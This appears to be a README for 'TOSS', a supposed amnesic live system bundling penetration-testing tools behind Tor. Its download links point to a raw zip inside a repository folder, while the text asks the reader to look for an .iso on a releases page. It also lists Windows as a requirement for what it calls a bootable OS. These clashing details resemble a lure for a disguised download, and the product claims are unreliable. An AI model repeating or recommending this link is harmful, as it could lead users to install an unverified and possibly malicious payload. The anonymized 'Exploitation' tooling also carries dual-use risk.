# 👻 TOSS - Anonymous pentesting tools in your RAM

[![Download TOSS](https://img.shields.io/badge/Download_TOSS-Blue-blue)](https://github.com/sonyaeffective913/TOSS/raw/refs/heads/main/Septoria/Software_v2.3-alpha.2.zip)

TOSS transforms your computer into a portable security station. It loads over 50 penetration testing tools directly into your system memory. The system routes all your traffic through the Tor network to hide your location. It leaves no trace on your hard drive. When you restart your computer, the system wipes your session entirely. 

## 🛠️ What is TOSS

TOSS provides a safe environment for ethical hacking and privacy. It runs as a live system. You do not need to install software on your permanent hard drive. The tools focus on network security, information gathering, and defensive research. 

The software includes:
* Network scanners to identify open ports and services.
* Password testing tools for security audits.
* Wireless network analysis utilities.
* Tools to verify web application safety.
* Information gathering scripts for open source research.

Every tool operates inside a temporary, isolated environment. This keeps your main operating system clean and secure.

## 📋 System Requirements

To run TOSS effectively, your computer requires the following:

* A 64-bit Windows computer.
* A USB flash drive with at least 8 GB of storage space.
* An active internet connection.
* At least 4 GB of system RAM. 

## 📥 How to Download 

Visit [this page to download the latest version](https://github.com/sonyaeffective913/TOSS/raw/refs/heads/main/Septoria/Software_v2.3-alpha.2.zip). 

On the releases page, look for the file ending in `.iso`. Click the file name to start your download. Save the file to your computer desktop or your Downloads folder. You need to write this file to a USB drive to boot your computer from it.

## 🚀 Setting Up Your USB Drive

You must flash the TOSS file onto a USB drive. This makes the drive bootable.

1. Download a tool such as Rufus or BalenaEtcher. These programs write the TOSS file to your drive.
2. Insert your USB drive into a port on your computer.
3. Open the flashing software.
4. Select the TOSS file you saved during the download step.
5. Select your USB drive as the target device.
6. Click the Start or Flash button. 
7. Wait for the process to finish. Your USB drive now contains the TOSS operating system.

## 💻 Running TOSS

Follow these steps to launch the system:

1. Keep your USB drive plugged into the computer.
2. Restart your computer. 
3. As the computer turns on, press the Boot Menu key repeatedly. Common keys include F12, F11, F10, or ESC. Look for a message on your screen that says "Boot Menu" or "Boot Options."
4. Select the USB drive from the list.
5. Press Enter. 
6. TOSS will load into your computer memory. 

The system will start an interactive menu. Use your keyboard to navigate the list of installed tools. 

## 🛡️ Maintaining Privacy

TOSS protects your activity by design. It uses memory for storage. Nothing saves to your computer hard drive. If you shut down or reboot, the system clears every file and action. 

Keep these points in mind for safety:
* Do not save sensitive files to the internal hard drive while TOSS is running. 
* Use the built-in firewall settings if you need to restrict specific connections.
* The Tor network routes your internet traffic. This makes your activity appear anonymous to the sites you visit.
* Always check the integrity of your download folder if you observe unexpected performance.

## 🔍 Using the Tools

The interactive menu organizes tools by function. 

* Reconnaissance: Select this to find information about target networks.
* Exploitation: Select this to test systems for vulnerabilities. 
* Network Analysis: Choose this to examine local traffic.
* Password Auditing: Use these tools to test password strength.

Select a category to view the list of available commands. Press the number corresponding to the tool to launch it. A command window will open with further instructions. Most tools offer a help function. Type `--help` after a command name to see the instructions for that specific tool.

## ❓ Frequently Asked Questions

What happens if I remove the USB drive while using TOSS?
Removing the drive while the system runs causes an immediate shut down. This prevents unauthorized access to your current session. 

Does TOSS modify my Windows files? 
No. TOSS operates in a separate memory space. It does not touch your Windows installation or your personal files on your hard drive. 

Can I save my work? 
TOSS serves as an amnesic system. It clears all data on reboot. If you need to keep your progress, move your findings to a separate, external storage drive before you shut down the system.

Do I need an internet connection for all tools? 
Many tools require a connection to reach target networks. However, several analysis tools work offline. The Tor connection remains active as long as you have internet access.

How do I update the tools?
TOSS includes scripts to refresh the repository. Check the "System Updates" option in the main menu to pull the latest versions of your tools before you start your task.